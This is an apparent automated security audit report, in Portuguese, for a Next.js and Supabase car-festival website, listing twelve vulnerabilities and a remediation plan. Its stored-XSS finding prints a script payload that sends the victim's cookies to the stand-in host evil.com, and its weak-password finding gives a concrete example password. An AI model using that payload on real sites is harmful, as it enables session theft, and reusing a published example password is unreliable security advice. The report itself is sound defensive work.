# 🔒 Relatório de Segurança — OliveiraCarFest

**Data**: 13/08/2026 | **Auditor**: Motor de Engenharia de Software  
**Escopo**: Análise completa de todos os Server Actions, Middleware, Autenticação, Banco de Dados e Configurações.

---

## Resumo Executivo

| Severidade | Quantidade |
|---|---|
| 🔴 **CRÍTICO** | 3 |
| 🟠 **ALTO** | 4 |
| 🟡 **MÉDIO** | 3 |
| 🟢 **BAIXO** | 2 |

**Total de vulnerabilidades encontradas: 12**

---

## 🔴 Vulnerabilidades CRÍTICAS

### CRIT-01: Server Actions Admin sem Verificação de Autenticação

**Risco: Qualquer pessoa da internet pode deletar eventos, patrocinadores, álbuns e alterar status de inscrições SEM estar logada.**

**Arquivos afetados:**
- `src/app/actions/events.ts` — `createEvent`, `deleteEvent`
- `src/app/actions/sponsors.ts` — `createSponsor`, `deleteSponsor`
- `src/app/actions/gallery.ts` — `createAlbum`, `deleteAlbum`
- `src/app/actions/leads.ts` — `deleteContactMessage`, `deleteSponsorLead`, `resolveSponsorLead`
- `src/app/actions/exhibitors.ts` — `updateExhibitorStatus`, `deleteExhibitorLead`

**Problema:** Essas Server Actions executam operações administrativas (INSERT, DELETE, UPDATE) mas nenhuma delas verifica se o usuário está autenticado antes de executar. O middleware protege apenas as **páginas** `/admin/*` de serem carregadas, mas **não impede que alguém invoque a Server Action diretamente** via HTTP POST.

Um atacante pode simplesmente enviar uma requisição POST para o endpoint da Server Action e deletar todos os seus eventos sem precisar ver a tela de admin.

**Correção:** Criar uma função auxiliar `requireAdmin()` e chamar no início de toda Server Action administrativa.

**Status:** ⬜ Pendente

---

### CRIT-02: Cookie do Portal do Expositor sem Assinatura/Criptografia

**Risco: Um hacker pode forjar o cookie e acessar o portal de QUALQUER expositor.**

**Arquivo afetado:** `src/app/actions/portal.ts` (linhas 39-46)

**Problema:** O cookie `portal_session` armazena `{ id, plate }` em **texto puro (JSON)**. Qualquer pessoa pode criar um cookie no navegador com um UUID válido e acessar o dashboard de outro expositor. Não há assinatura criptográfica (HMAC) para garantir que o cookie não foi adulterado.

**Correção:** Assinar o cookie com HMAC-SHA256 usando uma chave secreta no `.env` (`PORTAL_SESSION_SECRET`), garantindo que só o servidor consegue gerar e validar cookies legítimos.

**Status:** ⬜ Pendente

---

### CRIT-03: Ausência de Rate Limiting nos Formulários Públicos

**Risco: Ataques de spam/flooding que lotam o banco de dados com lixo e permitem brute-force no portal.**

**Endpoints afetados:**
- `createExhibitorLead` (inscrição de expositor)
- `submitContactForm` (formulário de contato)
- `submitSponsorLead` (formulário de patrocinador)
- `loginToPortal` (tentativas de login do portal — permite brute-force)

**Problema:** Não há nenhum mecanismo de rate limiting. Um bot pode enviar milhares de inscrições falsas por segundo, lotar a tabela `exhibitor_leads` e ainda tentar adivinhar combinações de placa+telefone no portal por força bruta.

**Correção:** Implementar rate limiting por IP usando headers de request. Usar `headers()` do Next.js para capturar o IP e um Map em memória para limitar tentativas (ex: máximo 5 tentativas de login por minuto por IP).

**Status:** ⬜ Pendente

---

## 🟠 Vulnerabilidades ALTAS

### HIGH-01: Upload de Arquivos sem Validação de Tipo/Tamanho

**Arquivos afetados:**
- `src/app/actions/events.ts` (linhas 34-41) — Upload de banner
- `src/app/actions/gallery.ts` (linhas 28-35) — Upload de fotos
- `src/app/actions/sponsors.ts` (linhas 31-39) — Upload de logos

**Problema:** Não há verificação do tipo MIME do arquivo nem do tamanho máximo. Um atacante com acesso admin poderia fazer upload de um `.exe`, `.php` ou um arquivo de 500MB para esgotar o storage.

**Correção:** Validar extensão (apenas `.jpg`, `.jpeg`, `.png`, `.webp`, `.gif`) e tamanho máximo (5MB) antes de fazer upload.

**Status:** ⬜ Pendente

---

### HIGH-02: Sanitização Insuficiente de Inputs (XSS Stored)

**Problema:** Os dados dos formulários são validados com Zod (comprimento mínimo/formato), mas **nenhum campo de texto livre é sanitizado contra HTML/JavaScript**. Um atacante pode submeter uma inscrição de expositor com:

```
Modificações: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

Quando o admin abrir o painel, o script poderia ser executado no contexto do navegador dele.

**Nota mitigante:** React escapa HTML por padrão no JSX, o que mitiga parcialmente esse risco. Porém, se algum dia for usado `dangerouslySetInnerHTML` ou renderizar em contexto não-React (email, PDF), estará exposto.

**Correção:** Adicionar sanitização nos campos de texto livre no Zod para remover tags HTML antes de gravar no banco.

**Status:** ⬜ Pendente

---

### HIGH-03: Headers de Segurança HTTP Ausentes

**Arquivo afetado:** `next.config.ts`

**Problema:** O `next.config.ts` está vazio — nenhum header de segurança está configurado:
- `X-Frame-Options` — proteção contra clickjacking
- `X-Content-Type-Options` — previne MIME sniffing
- `Referrer-Policy` — controla vazamento de dados em referrers
- `Content-Security-Policy` — controla recursos permitidos
- `Strict-Transport-Security` — força HTTPS
- `Permissions-Policy` — controla acesso a câmera, microfone, etc.

**Correção:** Adicionar headers de segurança no `next.config.ts` via propriedade `headers`.

**Status:** ⬜ Pendente

---

### HIGH-04: Variáveis de Ambiente sem `.env.example`

**Problema:** Não existe um `.env.example` para documentar as variáveis necessárias sem expor valores reais. Se alguém clonar o repositório, não saberá quais variáveis configurar. O `.env` está corretamente no `.gitignore`.

**Correção:** Criar `.env.example` com variáveis documentadas sem valores reais.

**Status:** ⬜ Pendente

---

## 🟡 Vulnerabilidades MÉDIAS

### MED-01: Portal Login Permite Enumeração de Inscrições

**Arquivo:** `src/app/actions/portal.ts` (linhas 29-35)

**Problema:** As mensagens de erro revelam o status da inscrição ("em análise", "não foi selecionado"). Um atacante pode testar combinações de placa+telefone para descobrir quais carros estão inscritos e seus status.

**Correção:** Unificar mensagens de erro para não revelar status internos a não autenticados. Usar uma mensagem genérica como "Credenciais inválidas ou acesso não autorizado."

**Status:** ⬜ Pendente

---

### MED-02: Ausência de Proteção CSRF Explícita para Produção

**Problema:** As Server Actions do Next.js 15+ possuem proteção CSRF nativa via header de origem. Porém, para ambientes de produção com domínio customizado, é necessário configurar `serverActions.allowedOrigins` no `next.config.ts` para garantir que apenas requisições do seu domínio oficial sejam aceitas.

**Correção:** Configurar `allowedOrigins` no `next.config.ts` apontando para o domínio de produção.

**Status:** ⬜ Pendente

---

### MED-03: Console.error Expõe Detalhes Internos em Produção

**Arquivos afetados:**
- `src/app/actions/events.ts`
- `src/app/actions/gallery.ts`
- `src/app/actions/contact.ts`
- `src/app/actions/exhibitors.ts`

**Problema:** `console.error` com objetos de erro do Supabase pode vazar informações de esquema do banco de dados nos logs de produção (nome de tabelas, colunas, restrições). Essas informações facilitam ataques direcionados.

**Correção:** Substituir por mensagens genéricas em produção ou usar logging estruturado que filtra dados sensíveis.

**Status:** ⬜ Pendente

---

## 🟢 Vulnerabilidades BAIXAS

### LOW-01: Senha de Admin Fraca

**Observação:** A senha utilizada pelo administrador possui apenas 6 dígitos numéricos. É extremamente vulnerável a ataques de dicionário/brute-force, especialmente considerando a ausência de rate limiting (CRIT-03).

**Recomendação:** Trocar para uma senha com no mínimo 12 caracteres, contendo letras maiúsculas, minúsculas, números e símbolos. Exemplo de formato seguro: `Olv#CarF3st!2026`

**Status:** ⬜ Pendente

---

### LOW-02: Rotas Sensíveis Não Bloqueadas no robots.txt

**Arquivo:** `src/app/robots.ts`

**Problema:** As rotas `/admin/*`, `/login` e `/portal/*` podem estar sendo indexadas por bots de busca (Google, Bing), expondo a existência dessas áreas restritas.

**Correção:** Garantir que rotas sensíveis estejam no `Disallow` do robots.txt.

**Status:** ⬜ Pendente

---

## Plano de Correção Consolidado

| # | Severidade | Arquivo | Ação |
|---|---|---|---|
| 1 | 🔴 CRIT-01 | `src/lib/supabase/auth-guard.ts` | **[NOVO]** Criar função `requireAdmin()` |
| 2 | 🔴 CRIT-01 | `src/app/actions/events.ts` | Adicionar `requireAdmin()` |
| 3 | 🔴 CRIT-01 | `src/app/actions/sponsors.ts` | Adicionar `requireAdmin()` |
| 4 | 🔴 CRIT-01 | `src/app/actions/gallery.ts` | Adicionar `requireAdmin()` |
| 5 | 🔴 CRIT-01 | `src/app/actions/leads.ts` | Adicionar `requireAdmin()` |
| 6 | 🔴 CRIT-01 | `src/app/actions/exhibitors.ts` | Adicionar `requireAdmin()` em update/delete |
| 7 | 🔴 CRIT-02 | `src/app/actions/portal.ts` | Implementar HMAC-SHA256 no cookie |
| 8 | 🔴 CRIT-03 | `src/lib/rate-limit.ts` | **[NOVO]** Criar rate limiter |
| 9 | 🔴 CRIT-03 | `src/app/actions/portal.ts` | Aplicar rate limit no login |
| 10 | 🔴 CRIT-03 | `src/app/actions/exhibitors.ts` | Aplicar rate limit na inscrição |
| 11 | 🔴 CRIT-03 | `src/app/actions/contact.ts` | Aplicar rate limit no contato |
| 12 | 🔴 CRIT-03 | `src/app/actions/sponsor.ts` | Aplicar rate limit no lead patrocinador |
| 13 | 🟠 HIGH-01 | `src/lib/supabase/storage.ts` | Validar tipo e tamanho de arquivo |
| 14 | 🟠 HIGH-02 | `src/lib/sanitize.ts` | **[NOVO]** Sanitização de HTML |
| 15 | 🟠 HIGH-03 | `next.config.ts` | Headers de segurança HTTP |
| 16 | 🟠 HIGH-04 | `.env.example` | **[NOVO]** Template de env |
| 17 | 🟡 MED-01 | `src/app/actions/portal.ts` | Unificar mensagens de erro |
| 18 | 🟡 MED-02 | `next.config.ts` | Configurar `allowedOrigins` |
| 19 | 🟡 MED-03 | Diversos | Remover `console.error` com dados sensíveis |
| 20 | 🟢 LOW-02 | `src/app/robots.ts` | Bloquear /admin, /login, /portal |

---

## Requisitos para Execução

Para implementar todas as correções, será necessário:

1. **Nova variável no `.env`:**
   ```
   PORTAL_SESSION_SECRET=sua_chave_secreta_aleatoria_aqui_minimo_32_caracteres
   ```

2. **Trocar senha do admin** no painel do Supabase por uma senha forte (mínimo 12 caracteres com letras, números e símbolos).

3. **Nenhuma alteração no banco de dados** é necessária — todas as correções são exclusivamente no código.

---

*Documento gerado automaticamente pela auditoria de segurança do Motor de Engenharia de Software.*
